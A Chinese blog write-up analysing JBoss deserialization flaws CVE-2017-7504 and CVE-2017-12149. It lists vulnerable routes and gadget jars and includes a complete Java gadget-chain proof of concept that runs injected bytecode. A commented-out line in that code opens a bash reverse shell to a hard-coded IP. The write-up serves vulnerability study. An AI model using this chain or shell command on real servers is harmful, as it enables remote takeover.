---
layout: post
title: JBOSS漏洞分析
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---

 

## 前言

```java
JBoss是一个基于J2EE开发源代码的应用服务器，是一个开源的。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB2.0和EJB3的规范， 但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或 Jetty绑定使用。
```

## CVE-2017-7504

这个漏洞仅仅是一个反序列化的,下载地址：https://sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA

```java
影响版本：JBoss AS 4.x及之前版本
```

安装成功后需要修改`jboss-4.2.3.GA/server/all/deploy/jboss-web.deployer/server.xml`，设置远程访问

![image-20231211175121457](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211175121457.png)

#### 漏洞分析

看到

`jboss-4.2.3.GA/server/all/deploy-hasingleton/jms/jbossmq-httpil.sar/jbossmq-httpil.war/WEB-INF/web.xml`

可以看到这是一个servlet，可以通过设置路由进行访问

![image-20231211175933929](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211175933929.png)

存在一个 HTTPServerILServlet 的 servlet，跟进到类

`org.jboss.mq.il.http.servlet.HTTPServerILServlet`

直接对输入的流进行readObject造成漏洞

![image-20231211180245356](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211180245356.png)

## CVE-2017-12149

```java
影响版本：5.x、6.x
```

下载地址：https://jbossas.jboss.org/downloads/，我这里下载的版本为JBoss AS 6.1.0.Final

#### 漏洞分析

漏洞触发点在`org.jboss.invocation.http.servlet.ReadOnlyAccessFilter#doFilter`方法
![image-20231211184114359](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211184114359.png)

可以看出它从POST中获取数据，然后调用readObject()方法对数据流进行反序列化

在web.xml中发现了过滤路由的位置

![image-20231211184540781](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211184540781.png)

在`org.jboss.invocation.http.servlet.InvokerServlet#processRequest`同样存在反序列化点
![image-20231211185406822](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211185406822.png)

并且，doget 、dopost都会调用processRequest这个方法

![image-20231211185550700](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211185550700.png)

有危险的路由

```java
/invoker/readonly/*
/invoker/JMXInvokerServlet/*
/invoker/EJBInvokerServlet/*
/invoker/JMXInvokerHAServlet/*
/invoker/EJBInvokerHAServlet/*
/invoker/restricted/JMXInvokerServlet/* (需要登录)
```

可利用的jar包依赖

```java
commons-collections-3.1.jar
commons-beanutils-1.8.0.jar
hibernate-core-3.6.6.Final.jar
```

访问500错误说明有漏洞，这里先用工具实验一下，（[yunxu1/jboss-_CVE-2017-12149: CVE-2017-12149 jboss反序列化 可回显 (github.com)](https://github.com/yunxu1/jboss-_CVE-2017-12149)）

![image-20231211190754041](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211190754041.png)

![image-20231211191257461](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211191257461.png)

#### JBossInterceptors1

```java


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javassist.*;

import javassist.ClassPool;
import org.jboss.interceptor.builder.InterceptionModelBuilder;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.interceptor.reader.DefaultMethodMetadata;
import org.jboss.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.interceptor.spi.metadata.InterceptorReference;
import org.jboss.interceptor.spi.metadata.MethodMetadata;
import org.jboss.interceptor.spi.model.InterceptionModel;
import org.jboss.interceptor.spi.model.InterceptionType;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.*;

import org.jboss.interceptor.builder.InterceptionModelBuilder;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.interceptor.proxy.InterceptorInvocation;
import org.jboss.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.interceptor.spi.instance.InterceptorInstantiator;

import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class poc {
    public static String string;
    public static void main(String[] args) throws NotFoundException, IOException, CannotCompileException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {

//public InterceptorMethodHandler(Object targetInstance,
// ClassMetadata<?> targetClassMetadata,
// InterceptionModel<ClassMetadata<?>, ?> interceptionModel,
// InterceptorInstantiator<?, ?> interceptorInstantiator,
// InvocationContextFactory invocationContextFactory)


        InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
        ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
        InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);

        Set<InterceptionType> s = new HashSet<InterceptionType>();
        s.add(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE);

        Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
        defaultMethodMetadataConstructor.setAccessible(true);
        MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s, MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));

        List list = new ArrayList();
        list.add(methodMetadata);
        Map<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();

        hashMap.put(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
        SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);

        builder.interceptAll().with(simpleInterceptorMetadata);

        InterceptionModel model = builder.build();

        HashMap map = new HashMap();
        map.put("ysoserial", "ysoserial");

//        TemplatesImpl obj = new TemplatesImpl();
//        setFieldValue(obj, "_bytecodes", new byte[][]{ClassPool.getDefault().get(Evil.class.getName()).toBytecode()});
//        setFieldValue(obj, "_name", "1");
//        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        TemplatesImpl obj=(TemplatesImpl)getTemplatesImpl();

        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();

        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {
            public Object createFor(InterceptorReference paramInterceptorReference) {
                return obj;
            }
        };
        InterceptorMethodHandler exp = new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(exp);
        out.close();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();



//        org.jboss.interceptor.proxy.InterceptorMethodHandler
//        TemplatesImpl templates=(TemplatesImpl) getTemplatesImpl();
//        templates.newTransformer();




    }
    public static Object getTemplatesImpl() throws IOException, NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException {
        TemplatesImpl templates=new TemplatesImpl();
        byte[] evilBytes=getEvilBytes();
        setFieldValue(templates,"_name","JYcxk");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(templates,"_bytecodes",new byte[][]{evilBytes});
        return templates;

    }
    public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException {
        Class clazz=object.getClass();
        Field declaredField=clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object,filed_value);
    }
    public static byte[] getEvilBytes() throws NotFoundException, CannotCompileException, IOException, NotFoundException, CannotCompileException, NotFoundException, CannotCompileException {
        ClassPool classPool = new ClassPool(true);
        CtClass hello = classPool.makeClass("Hello");
        CtClass ctClass = classPool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        hello.setSuperclass(ctClass);
        CtConstructor ctConstructor=new CtConstructor(new CtClass[]{},hello);
        //ctConstructor.setBody("java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/101.42.224.57/8080 0>&1\"});");
        ctConstructor.setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        hello.addConstructor(ctConstructor);
        byte[] bytes=hello.toBytecode();
        hello.detach();
        return bytes;
    }
    public static void serialize(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }
    public static void unserialize() throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}

```

```java
getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:74, InterceptorInvocation$InterceptorMethodInvocation (org.jboss.interceptor.proxy)
invokeNextInterceptor:87, SimpleInterceptionChain (org.jboss.interceptor.proxy)
executeInterception:133, InterceptorMethodHandler (org.jboss.interceptor.proxy)
readObject:158, InterceptorMethodHandler (org.jboss.interceptor.proxy)
```

直接进行调用链分析：

看到`org.jboss.interceptor.proxy.InterceptorMethodHandler`的初始化

#### 任意调用方法的点在`InterceptorInvocation$InterceptorMethodInvocation`内部类中，并且内部类构造方法是包权限，

里面的invoke我们调用后面invoke，因为要用Templates#newTransformer()无参数

this.method.getJavaMethod().invoke(this.instance);

```java
 public class InterceptorMethodInvocation {
        T instance;
        MethodMetadata method;

        InterceptorMethodInvocation(T instance, MethodMetadata method) {
            this.instance = instance;
            this.method = method;
        }

        Object invoke(InvocationContext invocationContext) throws Exception {
            return invocationContext != null ? this.method.getJavaMethod().invoke(this.instance, invocationContext) : this.method.getJavaMethod().invoke(this.instance);
                     //getJavaMethod()就是一个封装很好实现，instance需要成为我们的Templates对象，是个泛型应该也没问题
        }
```

#### ![image-20231211203211336](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211203211336.png)

简单看一下就行，就是初始化类的时候有些复杂。



## 回显构造

















